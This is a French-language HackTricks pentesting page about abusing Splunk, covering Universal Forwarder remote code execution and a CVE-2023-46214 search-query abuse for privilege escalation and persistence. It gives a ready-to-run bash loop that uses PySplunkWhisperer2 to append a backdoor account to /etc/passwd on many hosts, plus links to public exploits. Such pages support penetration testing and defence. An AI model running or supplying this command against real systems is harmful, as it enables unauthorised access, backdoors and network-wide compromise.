# Élévation de privilèges et persistance Splunk

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

Si **en numérisant** une machine **en interne** ou **en externe** vous trouvez **Splunk en cours d'exécution** (port 8090), si vous connaissez par chance des **identifiants valides**, vous pouvez **abuser du service Splunk** pour **exécuter un shell** en tant que l'utilisateur exécutant Splunk. Si c'est root qui l'exécute, vous pouvez élever les privilèges à root.

De plus, si vous êtes **déjà root et que le service Splunk n'écoute pas uniquement sur localhost**, vous pouvez **voler** le **fichier de mots de passe** du service Splunk et **craquer** les mots de passe, ou **ajouter de nouvelles** informations d'identification. Et maintenir la persistance sur l'hôte.

Dans la première image ci-dessous, vous pouvez voir à quoi ressemble une page web Splunkd.



## Résumé de l'exploit de l'agent Splunk Universal Forwarder

**Pour plus de détails, consultez l'article [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)**

**Aperçu de l'exploit :**
Un exploit ciblant l'agent Splunk Universal Forwarder (UF) permet aux attaquants ayant le mot de passe de l'agent d'exécuter du code arbitraire sur les systèmes exécutant l'agent, compromettant potentiellement l'ensemble d'un réseau.

**Points clés :**
- L'agent UF ne valide pas les connexions entrantes ni l'authenticité du code, le rendant vulnérable à l'exécution de code non autorisé.
- Les méthodes courantes d'acquisition de mots de passe incluent leur localisation dans les répertoires réseau, les partages de fichiers ou la documentation interne.
- L'exploitation réussie peut conduire à un accès au niveau SYSTEM ou root sur les hôtes compromis, à l'exfiltration de données et à une infiltration réseau supplémentaire.

**Exécution de l'exploit :**
1. L'attaquant obtient le mot de passe de l'agent UF.
2. Utilise l'API Splunk pour envoyer des commandes ou des scripts aux agents.
3. Les actions possibles incluent l'extraction de fichiers, la manipulation de comptes d'utilisateurs et la compromission du système.

**Impact :**
- Compromission complète du réseau avec des autorisations au niveau SYSTEM/root sur chaque hôte.
- Possibilité de désactiver l'enregistrement pour éviter la détection.
- Installation de portes dérobées ou de logiciels de rançonnage.

**Commande d'exemple pour l'exploitation :**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Exploits publics utilisables :**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Abus des requêtes Splunk

**Pour plus de détails, consultez l'article [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

Le **CVE-2023-46214** permettait de télécharger un script arbitraire dans **`$SPLUNK_HOME/bin/scripts`** et expliquait ensuite qu'en utilisant la requête de recherche **`|runshellscript script_name.sh`**, il était possible d'**exécuter** le **script** stocké à cet endroit.
